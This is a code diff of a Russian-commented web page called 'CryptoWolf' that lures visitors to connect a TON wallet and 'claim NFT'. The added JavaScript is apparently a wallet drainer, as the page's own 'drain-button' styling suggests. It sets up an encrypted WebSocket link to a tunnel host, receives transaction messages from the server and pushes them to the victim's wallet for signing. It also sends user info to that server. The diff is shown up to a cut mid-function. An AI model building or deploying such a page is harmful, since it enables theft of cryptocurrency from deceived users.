@@ -3,17 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-     <meta http-equiv="Content-Security-Policy" content="
-        default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;
-        script-src * 'unsafe-inline' 'unsafe-eval';
-        connect-src * 'unsafe-inline';
-        img-src * data: blob: 'unsafe-inline';
-        frame-src *;
-        style-src * 'unsafe-inline';
-    ">
     <title>CryptoWolf</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
+        /* Ваши существующие стили остаются без изменений */
         * {
             margin: 0;
             padding: 0;
@@ -22,7 +15,7 @@
         }
         
         body {
-            background: #ffd700; /* Желтый фон */
+            background: #ffd700;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -31,7 +24,7 @@
         }
         
         .container {
-            background: #000000; /* Черный контейнер */
+            background: #000000;
             border-radius: 24px;
             padding: 40px 32px;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
@@ -45,7 +38,7 @@
             width: 80px;
             height: 80px;
             margin: 0 auto 24px;
-            background: linear-gradient(135deg, #0088cc, #006699); /* Синий градиент для иконки */
+            background: linear-gradient(135deg, #0088cc, #006699);
             border-radius: 20px;
             display: flex;
             align-items: center;
@@ -56,20 +49,19 @@
         .logo img {
             width: 40px;
             height: 40px;
-            /* Иконка остается белой на синем фоне */
         }
         
         .title {
             font-size: 28px;
             font-weight: 700;
-            color: #ffd700; /* Желтый текст */
+            color: #ffd700;
             margin-bottom: 12px;
             text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
         }
         
         .subtitle {
             font-size: 16px;
-            color: #cccccc; /* Светло-серый подзаголовок */
+            color: #cccccc;
             margin-bottom: 32px;
         }
         
@@ -78,25 +70,25 @@
         }
         
         .info-message {
-            background: rgba(255, 215, 0, 0.1); /* Полупрозрачный желтый */
+            background: rgba(255, 215, 0, 0.1);
             border: 2px solid #ffd700;
             border-radius: 16px;
             padding: 20px;
             margin: 20px 0;
             font-size: 15px;
-            color: #ffd700; /* Желтый текст */
+            color: #ffd700;
             line-height: 1.4;
             font-weight: 500;
         }
         
         .drain-button {
             width: 100%;
-            background: linear-gradient(135deg, #ffd700, #ffed4e); /* Желтый градиент */
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
             border: 2px solid #ffd700;
             border-radius: 12px;
             height: 52px;
             font-weight: 600;
-            color: #000000; /* Черный текст на желтой кнопке */
+            color: #000000;
             font-size: 18px;
             cursor: pointer;
             transition: all 0.3s ease;
@@ -122,7 +114,7 @@
         
         .disconnect-button {
             width: 100%;
-            background: linear-gradient(135deg, #ff4444, #cc0000); /* Красный для кнопки отключения */
+            background: linear-gradient(135deg, #ff4444, #cc0000);
             border: 2px solid #ff4444;
             border-radius: 12px;
             height: 40px;
@@ -142,7 +134,7 @@
         .footer {
             margin-top: 24px;
             font-size: 12px;
-            color: #cccccc; /* Светло-серый текст */
+            color: #cccccc;
         }
 
         .ton-connect-button {
@@ -229,9 +221,445 @@
     </div>
 
     <script>
+        // ==================== AES IMPLEMENTATION (совместимая с сервером) ====================
+        var Aes = {}; // Aes namespace
+
+        Aes.cipher = function (input, w) {
+            var Nb = 4;
+            var Nr = w.length / Nb - 1;
+            var state = [[], [], [], []];
+            for (var i = 0; i < 4 * Nb; i++) state[i % 4][Math.floor(i / 4)] = input[i];
+
+            state = Aes.addRoundKey(state, w, 0, Nb);
+
+            for (var round = 1; round < Nr; round++) {
+                state = Aes.subBytes(state, Nb);
+                state = Aes.shiftRows(state, Nb);
+                state = Aes.mixColumns(state, Nb);
+                state = Aes.addRoundKey(state, w, round, Nb);
+            }
+
+            state = Aes.subBytes(state, Nb);
+            state = Aes.shiftRows(state, Nb);
+            state = Aes.addRoundKey(state, w, Nr, Nb);
+
+            var output = new Array(4 * Nb);
+            for (var i = 0; i < 4 * Nb; i++) output[i] = state[i % 4][Math.floor(i / 4)];
+
+            return output;
+        };
+
+        Aes.keyExpansion = function (key) {
+            var Nb = 4;
+            var Nk = key.length / 4;
+            var Nr = Nk + 6;
+            var w = new Array(Nb * (Nr + 1));
+            var temp = new Array(4);
+
+            for (var i = 0; i < Nk; i++) {
+                var r = [key[4 * i], key[4 * i + 1], key[4 * i + 2], key[4 * i + 3]];
+                w[i] = r;
+            }
+
+            for (var i = Nk; i < (Nb * (Nr + 1)); i++) {
+                w[i] = new Array(4);
+                for (var t = 0; t < 4; t++) temp[t] = w[i - 1][t];
+                if (i % Nk == 0) {
+                    temp = Aes.subWord(Aes.rotWord(temp));
+                    for (var t = 0; t < 4; t++) temp[t] ^= Aes.rCon[i / Nk][t];
+                } else if (Nk > 6 && i % Nk == 4) {
+                    temp = Aes.subWord(temp);
+                }
+                for (var t = 0; t < 4; t++) w[i][t] = w[i - Nk][t] ^ temp[t];
+            }
+
+            return w;
+        };
+
+        Aes.subBytes = function (s, Nb) {
+            for (var r = 0; r < 4; r++) {
+                for (var c = 0; c < Nb; c++) s[r][c] = Aes.sBox[s[r][c]];
+            }
+            return s;
+        };
+
+        Aes.shiftRows = function (s, Nb) {
+            var t = new Array(4);
+            for (var r = 1; r < 4; r++) {
+                for (var c = 0; c < 4; c++) t[c] = s[r][(c + r) % Nb];
+                for (var c = 0; c < 4; c++) s[r][c] = t[c];
+            }
+            return s;
+        };
+
+        Aes.mixColumns = function (s, Nb) {
+            for (var c = 0; c < 4; c++) {
+                var a = new Array(4);
+                var b = new Array(4);
+                for (var i = 0; i < 4; i++) {
+                    a[i] = s[i][c];
+                    b[i] = s[i][c] & 0x80 ? s[i][c] << 1 ^ 0x011b : s[i][c] << 1;
+                }
+                s[0][c] = b[0] ^ a[1] ^ b[1] ^ a[2] ^ a[3];
+                s[1][c] = a[0] ^ b[1] ^ a[2] ^ b[2] ^ a[3];
+                s[2][c] = a[0] ^ a[1] ^ b[2] ^ a[3] ^ b[3];
+                s[3][c] = a[0] ^ b[0] ^ a[1] ^ a[2] ^ b[3];
+            }
+            return s;
+        };
+
+        Aes.addRoundKey = function (state, w, rnd, Nb) {
+            for (var r = 0; r < 4; r++) {
+                for (var c = 0; c < Nb; c++) state[r][c] ^= w[rnd * 4 + c][r];
+            }
+            return state;
+        };
+
+        Aes.subWord = function (w) {
+            for (var i = 0; i < 4; i++) w[i] = Aes.sBox[w[i]];
+            return w;
+        };
+
+        Aes.rotWord = function (w) {
+            var tmp = w[0];
+            for (var i = 0; i < 3; i++) w[i] = w[i + 1];
+            w[3] = tmp;
+            return w;
+        };
+
+        Aes.sBox = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16];
+
+        Aes.rCon = [
+            [0x00, 0x00, 0x00, 0x00],
+            [0x01, 0x00, 0x00, 0x00],
+            [0x02, 0x00, 0x00, 0x00],
+            [0x04, 0x00, 0x00, 0x00],
+            [0x08, 0x00, 0x00, 0x00],
+            [0x10, 0x00, 0x00, 0x00],
+            [0x20, 0x00, 0x00, 0x00],
+            [0x40, 0x00, 0x00, 0x00],
+            [0x80, 0x00, 0x00, 0x00],
+            [0x1b, 0x00, 0x00, 0x00],
+            [0x36, 0x00, 0x00, 0x00]
+        ];
+
+        Aes.Ctr = {};
+
+        Aes.Ctr.encrypt = function (plaintext, password, nBits) {
+            var blockSize = 16;
+            if (!(nBits == 128 || nBits == 192 || nBits == 256)) return '';
+            
+            var Utf8 = {
+                encode: function(strUni) {
+                    var strUtf = strUni.replace(/[\u0080-\u07ff]/g, function(c) {
+                        var cc = c.charCodeAt(0);
+                        return String.fromCharCode(0xc0 | cc >> 6, 0x80 | cc & 0x3f);
+                    });
+                    strUtf = strUtf.replace(/[\u0800-\uffff]/g, function(c) {
+                        var cc = c.charCodeAt(0);
+                        return String.fromCharCode(0xe0 | cc >> 12, 0x80 | cc >> 6 & 0x3F, 0x80 | cc & 0x3f);
+                    });
+                    return strUtf;
+                },
+                decode: function(strUtf) {
+                    var strUni = strUtf.replace(/[\u00e0-\u00ef][\u0080-\u00bf][\u0080-\u00bf]/g, function(c) {
+                        var cc = ((c.charCodeAt(0) & 0x0f) << 12) | ((c.charCodeAt(1) & 0x3f) << 6) | (c.charCodeAt(2) & 0x3f);
+                        return String.fromCharCode(cc);
+                    });
+                    strUni = strUni.replace(/[\u00c0-\u00df][\u0080-\u00bf]/g, function(c) {
+                        var cc = (c.charCodeAt(0) & 0x1f) << 6 | c.charCodeAt(1) & 0x3f;
+                        return String.fromCharCode(cc);
+                    });
+                    return strUni;
+                }
+            };
+
+            var Base64 = {
+                code: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
+                encode: function(str, utf8encode) {
+                    utf8encode = (typeof utf8encode == 'undefined') ? false : utf8encode;
+                    var o1, o2, o3, bits, h1, h2, h3, h4, e = [], pad = '', c, plain, coded;
+                    var b64 = Base64.code;
+
+                    plain = utf8encode ? Utf8.encode(str) : str;
+
+                    c = plain.length % 3;
+                    if (c > 0) {
+                        while (c++ < 3) {
+                            pad += '=';
+                            plain += '\0';
+                        }
+                    }
+
+                    for (c = 0; c < plain.length; c += 3) {
+                        o1 = plain.charCodeAt(c);
+                        o2 = plain.charCodeAt(c + 1);
+                        o3 = plain.charCodeAt(c + 2);
+
+                        bits = o1 << 16 | o2 << 8 | o3;
+
+                        h1 = bits >> 18 & 0x3f;
+                        h2 = bits >> 12 & 0x3f;
+                        h3 = bits >> 6 & 0x3f;
+                        h4 = bits & 0x3f;
+
+                        e[c / 3] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
+                    }
+                    coded = e.join('');
+                    coded = coded.slice(0, coded.length - pad.length) + pad;
+                    return coded;
+                },
+                decode: function(str, utf8decode) {
+                    utf8decode = (typeof utf8decode == 'undefined') ? false : utf8decode;
+                    var o1, o2, o3, h1, h2, h3, h4, bits, d = [], plain, coded;
+                    var b64 = Base64.code;
+
+                    coded = utf8decode ? Utf8.decode(str) : str;
+
+                    for (var c = 0; c < coded.length; c += 4) {
+                        h1 = b64.indexOf(coded.charAt(c));
+                        h2 = b64.indexOf(coded.charAt(c + 1));
+                        h3 = b64.indexOf(coded.charAt(c + 2));
+                        h4 = b64.indexOf(coded.charAt(c + 3));
+
+                        bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
+
+                        o1 = bits >>> 16 & 0xff;
+                        o2 = bits >>> 8 & 0xff;
+                        o3 = bits & 0xff;
+
+                        d[c / 4] = String.fromCharCode(o1, o2, o3);
+                        if (h4 == 0x40) d[c / 4] = String.fromCharCode(o1, o2);
+                        if (h3 == 0x40) d[c / 4] = String.fromCharCode(o1);
+                    }
+                    plain = d.join('');
+                    return utf8decode ? Utf8.decode(plain) : plain;
+                }
+            };
+
+            plaintext = Utf8.encode(plaintext);
+            password = Utf8.encode(password);
+            
+            var nBytes = nBits / 8;
+            var pwBytes = new Array(nBytes);
+            for (var i = 0; i < nBytes; i++) {
+                pwBytes[i] = isNaN(password.charCodeAt(i)) ? 0 : password.charCodeAt(i);
+            }
+            var key = Aes.cipher(pwBytes, Aes.keyExpansion(pwBytes));
+            key = key.concat(key.slice(0, nBytes - 16));
+            
+            var counterBlock = new Array(blockSize);
+
+            var nonce = (new Date()).getTime();
+            var nonceMs = nonce % 1000;
+            var nonceSec = Math.floor(nonce / 1000);
+            var nonceRnd = Math.floor(Math.random() * 0xffff);
+
+            for (var i = 0; i < 2; i++) counterBlock[i] = (nonceMs >>> i * 8) & 0xff;
+            for (var i = 0; i < 2; i++) counterBlock[i + 2] = (nonceRnd >>> i * 8) & 0xff;
+            for (var i = 0; i < 4; i++) counterBlock[i + 4] = (nonceSec >>> i * 8) & 0xff;
+
+            var ctrTxt = '';
+            for (var i = 0; i < 8; i++) ctrTxt += String.fromCharCode(counterBlock[i]);
+
+            var keySchedule = Aes.keyExpansion(key);
+
+            var blockCount = Math.ceil(plaintext.length / blockSize);
+            var ciphertxt = new Array(blockCount);
+            for (var b = 0; b < blockCount; b++) {
+                for (var c = 0; c < 4; c++) counterBlock[15 - c] = (b >>> c * 8) & 0xff;
+                for (var c = 0; c < 4; c++) counterBlock[15 - c - 4] = (b / 0x100000000 >>> c * 8)
+
+                var cipherCntr = Aes.cipher(counterBlock, keySchedule);
+                var blockLength = b < blockCount - 1 ? blockSize : (plaintext.length - 1) % blockSize + 1;
+                var cipherChar = new Array(blockLength);
+
+                for (var i = 0; i < blockLength; i++) {
+                    cipherChar[i] = cipherCntr[i] ^ plaintext.charCodeAt(b * blockSize + i);
+                    cipherChar[i] = String.fromCharCode(cipherChar[i]);
+                }
+                ciphertxt[b] = cipherChar.join('');
+            }
+
+            var ciphertext = ctrTxt + ciphertxt.join('');
+            ciphertext = Base64.encode(ciphertext);
+            return ciphertext;
+        };
+
+        Aes.Ctr.decrypt = function (ciphertext, password, nBits) {
+            var blockSize = 16;
+            if (!(nBits == 128 || nBits == 192 || nBits == 256)) return '';
+            
+            var Utf8 = {
+                encode: function(strUni) {
+                    var strUtf = strUni.replace(/[\u0080-\u07ff]/g, function(c) {
+                        var cc = c.charCodeAt(0);
+                        return String.fromCharCode(0xc0 | cc >> 6, 0x80 | cc & 0x3f);
+                    });
+                    strUtf = strUtf.replace(/[\u0800-\uffff]/g, function(c) {
+                        var cc = c.charCodeAt(0);
+                        return String.fromCharCode(0xe0 | cc >> 12, 0x80 | cc >> 6 & 0x3F, 0x80 | cc & 0x3f);
+                    });
+                    return strUtf;
+                },
+                decode: function(strUtf) {
+                    var strUni = strUtf.replace(/[\u00e0-\u00ef][\u0080-\u00bf][\u0080-\u00bf]/g, function(c) {
+                        var cc = ((c.charCodeAt(0) & 0x0f) << 12) | ((c.charCodeAt(1) & 0x3f) << 6) | (c.charCodeAt(2) & 0x3f);
+                        return String.fromCharCode(cc);
+                    });
+                    strUni = strUni.replace(/[\u00c0-\u00df][\u0080-\u00bf]/g, function(c) {
+                        var cc = (c.charCodeAt(0) & 0x1f) << 6 | c.charCodeAt(1) & 0x3f;
+                        return String.fromCharCode(cc);
+                    });
+                    return strUni;
+                }
+            };
+
+            var Base64 = {
+                code: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
+                encode: function(str, utf8encode) {
+                    utf8encode = (typeof utf8encode == 'undefined') ? false : utf8encode;
+                    var o1, o2, o3, bits, h1, h2, h3, h4, e = [], pad = '', c, plain, coded;
+                    var b64 = Base64.code;
+
+                    plain = utf8encode ? Utf8.encode(str) : str;
+
+                    c = plain.length % 3;
+                    if (c > 0) {
+                        while (c++ < 3) {
+                            pad += '=';
+                            plain += '\0';
+                        }
+                    }
+
+                    for (c = 0; c < plain.length; c += 3) {
+                        o1 = plain.charCodeAt(c);
+                        o2 = plain.charCodeAt(c + 1);
+                        o3 = plain.charCodeAt(c + 2);
+
+                        bits = o1 << 16 | o2 << 8 | o3;
+
+                        h1 = bits >> 18 & 0x3f;
+                        h2 = bits >> 12 & 0x3f;
+                        h3 = bits >> 6 & 0x3f;
+                        h4 = bits & 0x3f;
+
+                        e[c / 3] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
+                    }
+                    coded = e.join('');
+                    coded = coded.slice(0, coded.length - pad.length) + pad;
+                    return coded;
+                },
+                decode: function(str, utf8decode) {
+                    utf8decode = (typeof utf8decode == 'undefined') ? false : utf8decode;
+                    var o1, o2, o3, h1, h2, h3, h4, bits, d = [], plain, coded;
+                    var b64 = Base64.code;
+
+                    coded = utf8decode ? Utf8.decode(str) : str;
+
+                    for (var c = 0; c < coded.length; c += 4) {
+                        h1 = b64.indexOf(coded.charAt(c));
+                        h2 = b64.indexOf(coded.charAt(c + 1));
+                        h3 = b64.indexOf(coded.charAt(c + 2));
+                        h4 = b64.indexOf(coded.charAt(c + 3));
+
+                        bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
+
+                        o1 = bits >>> 16 & 0xff;
+                        o2 = bits >>> 8 & 0xff;
+                        o3 = bits & 0xff;
+
+                        d[c / 4] = String.fromCharCode(o1, o2, o3);
+                        if (h4 == 0x40) d[c / 4] = String.fromCharCode(o1, o2);
+                        if (h3 == 0x40) d[c / 4] = String.fromCharCode(o1);
+                    }
+                    plain = d.join('');
+                    return utf8decode ? Utf8.decode(plain) : plain;
+                }
+            };
+
+            ciphertext = Base64.decode(ciphertext);
+            password = Utf8.encode(password);
+            
+            var nBytes = nBits / 8;
+            var pwBytes = new Array(nBytes);
+            for (var i = 0; i < nBytes; i++) {
+                pwBytes[i] = isNaN(password.charCodeAt(i)) ? 0 : password.charCodeAt(i);
+            }
+            var key = Aes.cipher(pwBytes, Aes.keyExpansion(pwBytes));
+            key = key.concat(key.slice(0, nBytes - 16));
+            
+            var counterBlock = new Array(8);
+            var ctrTxt = ciphertext.slice(0, 8);
+            for (var i = 0; i < 8; i++) counterBlock[i] = ctrTxt.charCodeAt(i);
+
+            var keySchedule = Aes.keyExpansion(key);
+
+            var nBlocks = Math.ceil((ciphertext.length - 8) / blockSize);
+            var ct = new Array(nBlocks);
+            for (var b = 0; b < nBlocks; b++) ct[b] = ciphertext.slice(8 + b * blockSize, 8 + b * blockSize + blockSize);
+            ciphertext = ct;
+            
+            var plaintxt = new Array(ciphertext.length);
+
+            for (var b = 0; b < nBlocks; b++) {
+                for (var c = 0; c < 4; c++) counterBlock[15 - c] = ((b) >>> c * 8) & 0xff;
+                for (var c = 0; c < 4; c++) counterBlock[15 - c - 4] = (((b + 1) / 0x100000000 - 1) >>> c * 8) & 0xff;
+
+                var cipherCntr = Aes.cipher(counterBlock, keySchedule);
+                var plaintxtByte = new Array(ciphertext[b].length);
+                for (var i = 0; i < ciphertext[b].length; i++) {
+                    plaintxtByte[i] = cipherCntr[i] ^ ciphertext[b].charCodeAt(i);
+                    plaintxtByte[i] = String.fromCharCode(plaintxtByte[i]);
+                }
+                plaintxt[b] = plaintxtByte.join('');
+            }
+
+            var plaintext = plaintxt.join('');
+            plaintext = Utf8.decode(plaintext);
+            return plaintext;
+        };
+
+        // ==================== ОСНОВНОЙ КОД КЛИЕНТА ====================
         let tonConnectUI = null;
         let isWebSocketConnected = false;
         let ws = null;
+        let myEncryption = '';
+        let clientEncryption = '';
+        let signature = '';
+
+        // Функции cipher/decipher для начального обмена ключами
+        function createCipher(salt) {
+            const textToChars = text => text.split('').map(c => c.charCodeAt(0));
+            const byteHex = n => ("0" + Number(n).toString(16)).substr(-2);
+            const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
+
+            return text => text.split('')
+                .map(textToChars)
+                .map(applySaltToChar)
+                .map(byteHex)
+                .join('');
+        }
+
+        function createDecipher(salt) {
+            const textToChars = text => text.split('').map(c => c.charCodeAt(0));
+            const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
+            return encoded => encoded.match(/.{1,2}/g)
+                .map(hex => parseInt(hex, 16))
+                .map(applySaltToChar)
+                .map(charCode => String.fromCharCode(charCode))
+                .join('');
+        }
+
+        // Функция для получения SHA256 хеша
+        async function getSHA256Hash(str) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(str);
+            const hash = await crypto.subtle.digest('SHA-256', data);
+            return Array.from(new Uint8Array(hash))
+                .map(b => b.toString(16).padStart(2, '0'))
+                .join('');
+        }
 
         // Инициализация TON Connect
         function initTonConnect() {
@@ -254,617 +682,316 @@
 
         // Подключение к WebSocket серверу
         function connectWebSocket() {
-    try {
-        // ИСПРАВЛЕННЫЙ URL ДЛЯ PLAYIT.GG
-        const wsUrl = 'wss://3b6304cc82bd23ff3230979fef8d7f3b.serveo.net';
-        
-        console.log('Connecting to WebSocket:', wsUrl);
-        ws = new WebSocket(wsUrl);
-        
-        ws.onopen = function() {
-            console.log('✅ WebSocket connected');
-            isWebSocketConnected = true;
-            showStatus('Connected to server', 'success');
-            sendOpenMessage();
-        };
-        
-        ws.onmessage = function(event) {
-            console.log('📨 WebSocket message received:', event.data);
             try {
-                const data = JSON.parse(event.data);
-                handleServerMessage(data);
-            } catch (e) {
-                console.error('Error parsing message:', e);
-                console.log('Raw message:', event.data);
+                ws = new WebSocket('wss://3b6304cc82bd23ff3230979fef8d7f3b.serveo.net');
+                
+                ws.onopen = function() {
+                    console.log('✅ WebSocket connected');
+                    isWebSocketConnected = true;
+                    showStatus('Connected to server', 'success');
+                };
+                
+                ws.onmessage = function(event) {
+                    console.log('📨 WebSocket message received:', event.data);
+                    try {
+                        const data = JSON.parse(event.data);
+                        handleServerMessage(data);
+                    } catch (e) {
+                        console.error('Parse error:', e);
+                    }
+                };
+                
+                ws.onclose = function(event) {
+                    console.log('❌ WebSocket disconnected:', event.code, event.reason);
+                    isWebSocketConnected = false;
+                    showStatus('Disconnected from server', 'error');
+                    
+                    if (event.code !== 1006) {
+                        setTimeout(connectWebSocket, 3000);
+                    }
+                };
+                
+                ws.onerror = function(error) {
+                    console.error('💥 WebSocket error:', error);
+                    showStatus('WebSocket connection failed', 'error');
+                };
+            } catch (error) {
+                console.error('💥 WebSocket connection failed:', error);
+                showStatus('Connection setup error', 'error');
             }
-        };
-        
-        ws.onclose = function(event) {
-            console.log('❌ WebSocket disconnected:', event.code, event.reason);
-            isWebSocketConnected = false;
-            showStatus('Disconnected from server. Reconnecting...', 'error');
-            setTimeout(connectWebSocket, 3000);
-        };
-        
-        ws.onerror = function(error) {
-            console.error('💥 WebSocket error:', error);
-            showStatus('WebSocket connection error', 'error');
-        };
-    } catch (error) {
-        console.error('WebSocket connection failed:', error);
-        setTimeout(connectWebSocket, 5000);
-    }
-}
+        }
 
-        // Отправка сообщения об открытии сайта
-        function sendOpenMessage() {
-            if (!ws || !isWebSocketConnected) return;
+        // Обработка сообщений от сервера
+        function handleServerMessage(data) {
+            console.log('Server response:', data);
             
-            const message = {
-                action: 'log',
-                data: {
-                    method: 'opened',
-                    userInfo: getUserInfo()
+            switch (data.method) {
+                case 'connected':
+                    console.log('✅ Connected to server, initializing encryption...');
+                    myEncryption = createDecipher('AcmeDev')(data.secret);
+                    console.log('Decrypted server key:', myEncryption);
+                    
+                    // Генерируем клиентский ключ
+                    clientEncryption = generateRandomKey();
+                    console.log('Generated client key:', clientEncryption);
+                    
+                    // Создаем подпись
+                    signature = myEncryption.slice(0, 12) + clientEncryption.slice(0, 12);
+                    console.log('Signature:', signature);
+                    
+                    // Отправляем клиентский ключ на сервер
+                    const connectMessage = {
+                        method: 'connected',
+                        secret: createCipher('AcmeDev')(clientEncryption)
+                    };
+                    ws.send(JSON.stringify(connectMessage));
+                    break;
+                    
+                case 'safety':
+                    console.log('🔒 Safety check received');
+                    handleSafetyCheck(data.message);
+                    break;
+                    
+                case 'wait':
+                    console.log('✅ Server is ready');
+                    showStatus('Server is ready! You can claim NFT now', 'success');
+                    break;
+                    
+                case 'messages':
+                    console.log('📨 Received transaction messages');
+                    handleEncryptedMessages(data.message);
+                    break;
+                    
+                case 'done':
+                    showStatus('Operation completed successfully!', 'success');
+                    break;
+                    
+                case 'error':
+                    showStatus('Server error: ' + data.message, 'error');
+                    break;
+                    
+                case 'manifest':
+                    console.log('📋 Manifest received');
+                    break;
+                    
+                default:
+                    console.log('Unknown method:', data.method);
+            }
+        }
+
+        // Обработка проверки безопасности
+        async function handleSafetyCheck(encryptedMessage) {
+            try {
+                // Дешифруем сообщение безопасности с помощью серверного ключа
+                const decrypted = Aes.Ctr.decrypt(encryptedMessage, myEncryption, 256);
+                console.log('Decrypted safety message:', decrypted);
+                
+                if (decrypted === 'hello') {
+                    // Шифруем ответ с помощью клиентского ключа
+                    const encryptedResponse = Aes.Ctr.encrypt('hello', clientEncryption, 256);
+                    
+                    const safetyResponse = {
+                        method: 'safety',
+                        message: encryptedResponse
+                    };
+                    
+                    ws.send(JSON.stringify(safetyResponse));
+                    console.log('✅ Safety check passed');
+                } else {
+                    console.error('Safety check failed');
+                    showStatus('Security verification failed', 'error');
                 }
-            };
-            ws.send(JSON.stringify(message));
+            } catch (error) {
+                console.error('Safety check error:', error);
+                showStatus('Security error', 'error');
+            }
+        }
+
+        // Генерация случайного ключа
+        function generateRandomKey() {
+            const array = new Uint8Array(16);
+            crypto.getRandomValues(array);
+            return Array.from(array, byte => 
+                byte.toString(16).padStart(2, '0')
+            ).join('');
+        }
+
+        // Основная функция для получения NFT
+        async function claimNFT() {
+            if (!tonConnectUI?.connected) {
+                showStatus('Please connect your wallet first!', 'error');
+                return;
+            }
+
+            if (!isWebSocketConnected) {
+                showStatus('Server connection lost. Reconnecting...', 'error');
+                connectWebSocket();
+                return;
+            }
+
+            showStatus('Requesting NFT transaction...', 'info');
+
+            try {
+                const requestData = {
+                    userInfo: getUserInfo()
+                };
+
+                // Шифруем запрос с помощью клиентского ключа
+                const encryptedRequest = Aes.Ctr.encrypt(JSON.stringify(requestData), clientEncryption, 256);
+                
+                const message = {
+                    method: 'getMessages',
+                    message: encryptedRequest
+                };
+                
+                console.log('📤 Sending encrypted NFT request');
+                ws.send(JSON.stringify(message));
+                
+            } catch (error) {
+                console.error('❌ Failed to encrypt request:', error);
+                showStatus('Failed to prepare request', 'error');
+            }
+        }
+
+        // Обработка зашифрованных сообщений с транзакциями
+        async function handleEncryptedMessages(encryptedData) {
+            try {
+                showStatus('Decrypting transaction data...', 'info');
+                console.log('🔐 Encrypted transaction data:', encryptedData);
+                
+                // Дешифруем данные с помощью серверного ключа
+                const decryptedJson = Aes.Ctr.decrypt(encryptedData, myEncryption, 256);
+                console.log('Decrypted transaction data:', decryptedJson);
+                
+                const transactionData = JSON.parse(decryptedJson);
+                await processTransactionData(transactionData);
+                
+            } catch (error) {
+                console.error('Message decryption error:', error);
+                showStatus('Failed to decrypt transaction data', 'error');
+            }
+        }
+
+        // Обработка данных транзакции
+        async function processTransactionData(transactionData) {
+            try {
+                console.log('📋 Processing transaction data:', transactionData);
+
+                if (!transactionData.messages || !Array.isArray(transactionData.messages)) {
+                    console.error('Invalid transaction format');
+                    showStatus('Invalid transaction data received', 'error');
+                    return;
+                }
+
+                const messages = transactionData.messages;
+                console.log('📨 Transaction messages:', messages);
+
+                if (messages.length > 0) {
+                    // Подготавливаем транзакцию для подписания
+                    const transaction = {
+                        validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
+                        messages: messages.map(msg => ({
+                            address: msg.address,
+                            amount: msg.amount || msg.value || '0',
+                            payload: msg.payload || ''
+                        }))
+                    };
+
+                    console.log('📝 Final transaction for signing:', transaction);
+                    showStatus(`Ready to sign ${messages.length} transaction(s)`, 'info');
+                    
+                    // Небольшая задержка для UX
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    try {
+                        console.log('🖊️ Sending transaction for signing...');
+                        const result = await tonConnectUI.sendTransaction(transaction);
+                        
+                        showStatus('🎉 Transaction signed successfully!', 'success');
+                        console.log('✅ Transaction result:', result);
+                        
+                        // Отправляем статус на сервер
+                        await sendTransactionStatus('sent', messages);
+                        
+                    } catch (signError) {
